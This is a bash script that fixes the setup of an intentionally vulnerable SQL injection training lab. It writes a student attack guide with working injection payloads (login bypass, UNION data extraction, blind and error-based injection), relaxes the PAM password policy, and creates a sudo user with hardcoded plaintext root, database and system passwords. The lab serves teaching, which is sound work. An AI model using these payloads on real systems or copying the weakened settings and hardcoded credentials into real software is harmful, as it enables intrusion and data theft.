#!/bin/bash

# Fix and Complete SQL Injection Lab Setup
# Run this after the main setup script fails at password creation

set -e

echo "================================================"
echo "FIXING SQL INJECTION LAB SETUP"
echo "================================================"
echo ""

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
   echo -e "${RED}Please run as root (use sudo)${NC}"
   exit 1
fi

echo -e "${YELLOW}[1/4] Creating system user with workaround...${NC}"

# Remove user if exists (in case of partial creation)
userdel -r labuser 2>/dev/null || true

# Temporarily disable password complexity requirements
echo "Temporarily adjusting PAM settings..."
cp /etc/pam.d/common-password /etc/pam.d/common-password.backup

# Modify PAM to allow simple passwords temporarily
sed -i 's/^password.*requisite.*pam_pwquality.so.*$/password requisite pam_pwquality.so retry=3 minlen=1 difok=0 ucredit=0 lcredit=0 dcredit=0 ocredit=0/' /etc/pam.d/common-password 2>/dev/null || true

# Create user and set password
useradd -m -s /bin/bash labuser
echo "labuser:Lab123!@#" | chpasswd

# Add to sudo group
usermod -aG sudo labuser

# Restore original PAM settings
mv /etc/pam.d/common-password.backup /etc/pam.d/common-password

echo -e "${GREEN}User 'labuser' created successfully${NC}"

echo -e "${YELLOW}[2/4] Creating documentation files...${NC}"

# Create attack guide in web directory
cat > /var/www/vulnerable-site/ATTACK_GUIDE.md << 'EOF'
# SQL Injection Attack Guide - Educational Purpose Only

## Lab Overview
This is an intentionally vulnerable web application designed for learning SQL injection techniques.

## Attack Vectors

### 1. Basic Authentication Bypass
**Objective:** Login without valid credentials

**Attack payloads:**
```
Username: admin' --
Password: [anything]

Username: admin' OR '1'='1
Password: [anything]

Username: ' OR 1=1 --
Password: [anything]
```

**How it works:**
The query becomes: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`
The `--` comments out the password check.

### 2. Extracting Database Information

**Using UNION attacks in the search field:**
```
' UNION SELECT 1,database(),3,4 --
' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='vulnerable_db' --
' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='secrets' --
```

### 3. Extracting Sensitive Data

**Get data from secrets table:**
```
' UNION SELECT 1,secret_key,secret_value,4 FROM secrets --
' UNION SELECT 1,CONCAT(secret_key,':',secret_value),3,4 FROM secrets --
```

### 4. Advanced Techniques

**Blind SQL Injection:**
```
admin' AND 1=1 --  (True condition)
admin' AND 1=2 --  (False condition)
```

**Time-based Blind SQL Injection:**
```
admin' AND SLEEP(5) --
```

**Error-based SQL Injection:**
```
admin' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) --
```

## Post-Exploitation

### Once you have admin access:
1. Note the MySQL root credentials displayed
2. Connect to MySQL: `mysql -u root -prootpass123! vulnerable_db`
3. Explore the database structure
4. Find the flag in the secrets table

### System Access:
1. Use the discovered SSH/system credentials
2. SSH into the system: `ssh labuser@[server-ip]`
3. Explore the file system
4. Check web application source code in `/var/www/vulnerable-site`

## Prevention Techniques

1. **Never concatenate user input directly into SQL queries**
2. **Use prepared statements/parameterized queries**
3. **Implement input validation and sanitization**
4. **Use least privilege principle for database users**
5. **Never display detailed error messages in production**
6. **Implement proper authentication and session management**

## Learning Resources
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- SQL Injection Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
EOF

# Create instructor README
cat > /root/INSTRUCTOR_README.md << 'EOF'
# SQL Injection Lab - Instructor Guide

## Lab Setup Complete!

### Access Information:
- **Web Application:** http://[server-ip]/
- **MySQL Root:** root / rootpass123!
- **System User:** labuser / Lab123!@#
- **Web User (DB):** web_user / web_pass123

### Student Learning Path:
1. Basic authentication bypass
2. Database enumeration
3. Data extraction
4. System access

### Monitoring Student Progress:
```bash
# Watch Apache access logs
tail -f /var/log/apache2/vulnerable-site-access.log

# Watch MySQL queries
mysql -u root -prootpass123! -e "SELECT * FROM vulnerable_db.access_logs ORDER BY timestamp DESC LIMIT 10;"

# Check successful logins
grep "Login successful" /var/log/apache2/vulnerable-site-access.log
```

### Reset Lab:
```bash
mysql -u root -prootpass123! vulnerable_db < /tmp/setup_database.sql
systemctl restart apache2
```

### Test the Lab:
```bash
# Test web server
curl -I http://localhost/

# Test database
mysql -u root -prootpass123! -e "SELECT COUNT(*) FROM vulnerable_db.users;"
```

### Additional Challenges:
1. Have students write secure versions of the vulnerable code
2. Implement WAF rules to block SQL injection
3. Create detection scripts for SQL injection attempts
4. Practice with sqlmap tool

### Safety Reminder:
This lab is intentionally vulnerable. Ensure it's:
- Isolated from production networks
- Behind a firewall
- Only accessible to authorized students
- Regularly monitored for abuse
EOF

echo -e "${YELLOW}[3/4] Testing services...${NC}"

# Restart Apache to ensure all configurations are loaded
systemctl restart apache2

# Test Apache
if systemctl is-active --quiet apache2; then
    echo -e "${GREEN}✓ Apache is running${NC}"
else
    echo -e "${RED}✗ Apache is not running. Attempting to start...${NC}"
    systemctl start apache2
fi

# Test MySQL
if systemctl is-active --quiet mysql; then
    echo -e "${GREEN}✓ MySQL is running${NC}"
else
    echo -e "${RED}✗ MySQL is not running. Attempting to start...${NC}"
    systemctl start mysql
fi

# Test database connection and data
echo -e "${YELLOW}[4/4] Verifying database setup...${NC}"

# Check if database exists and has data
RESULT=$(mysql -u root -prootpass123! -e "SELECT COUNT(*) as count FROM vulnerable_db.users;" 2>/dev/null | tail -1)
if [ "$RESULT" -gt 0 ] 2>/dev/null; then
    echo -e "${GREEN}✓ Database is properly configured with $RESULT users${NC}"
else
    echo -e "${YELLOW}Database might need reconfiguration. Attempting to fix...${NC}"
    
    # Re-run the database setup
    if [ -f /tmp/setup_database.sql ]; then
        mysql < /tmp/setup_database.sql 2>/dev/null || {
            echo -e "${RED}Failed to setup database. You may need to run the main setup script again.${NC}"
        }
    fi
fi

# Test web application
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost/ 2>/dev/null)
if [ "$HTTP_CODE" = "200" ]; then
    echo -e "${GREEN}✓ Web application is accessible${NC}"
else
    echo -e "${RED}✗ Web application returned HTTP code: $HTTP_CODE${NC}"
fi

# Get IP address
IP=$(hostname -I | awk '{print $1}')

echo ""
echo -e "${GREEN}================================================${NC}"
echo -e "${GREEN}SQL INJECTION LAB SETUP FIXED AND COMPLETE!${NC}"
echo -e "${GREEN}================================================${NC}"
echo ""
echo -e "${YELLOW}Access the vulnerable application at:${NC}"
echo -e "${GREEN}http://$IP/${NC}"
echo ""
echo -e "${YELLOW}Login Credentials (legitimate):${NC}"
echo "Username: admin"
echo "Password: admin123"
echo ""
echo -e "${YELLOW}SQL Injection Test:${NC}"
echo "Username: admin' --"
echo "Password: [anything]"
echo ""
echo -e "${YELLOW}System Access (after exploitation):${NC}"
echo "SSH: ssh labuser@$IP"
echo "Password: Lab123!@#"
echo ""
echo -e "${YELLOW}MySQL Access:${NC}"
echo "mysql -u root -prootpass123! vulnerable_db"
echo ""
echo -e "${YELLOW}Documentation:${NC}"
echo "Attack Guide: /var/www/vulnerable-site/ATTACK_GUIDE.md"
echo "Instructor Guide: /root/INSTRUCTOR_README.md"
echo ""
echo -e "${RED}⚠️  SECURITY REMINDER ⚠️${NC}"
echo -e "${RED}This system is intentionally vulnerable!${NC}"
echo -e "${RED}Only use in isolated lab environments!${NC}"
echo -e "${RED}Never expose to the internet!${NC}"
echo ""
echo -e "${GREEN}Lab is ready for student exercises!${NC}"